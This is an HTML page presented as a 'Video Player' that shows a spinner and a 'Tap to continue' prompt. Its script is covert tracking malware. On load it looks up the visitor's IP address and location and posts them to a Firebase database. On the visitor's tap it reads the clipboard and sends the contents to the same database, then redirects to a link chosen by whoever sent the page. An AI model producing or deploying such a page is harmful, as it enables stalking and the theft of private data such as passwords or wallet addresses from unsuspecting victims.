<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #333; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status">
        <div class="loader"></div>
        <p id="msg" style="margin-top:20px; display:none;">Tap to continue...</p>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function start() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;

            const decoded = JSON.parse(atob(id));
            const userKey = decoded.k;
            const targetUrl = decoded.r;

            // 1. Get Location Info
            let info = { time: new Date().toLocaleString() };
            try {
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                info.ip = d.ip;
                info.loc = `${d.city}, ${d.country}`;
                info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            } catch(e) {}

            // Save Location
            await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(info) });

            // Show Tap message for Clipboard grab
            document.querySelector('.loader').style.display = 'none';
            document.getElementById('msg').style.display = 'block';

            document.body.onclick = async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if(text) {
                        await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
                            method: 'POST', 
                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
                        });
                    }
                } catch(e) {}
                window.location.href = targetUrl;
            };

            // Auto redirect fallback
            setTimeout(() => { window.location.href = targetUrl; }, 5000);
        }
        start();
    </script>
</body>
</html>
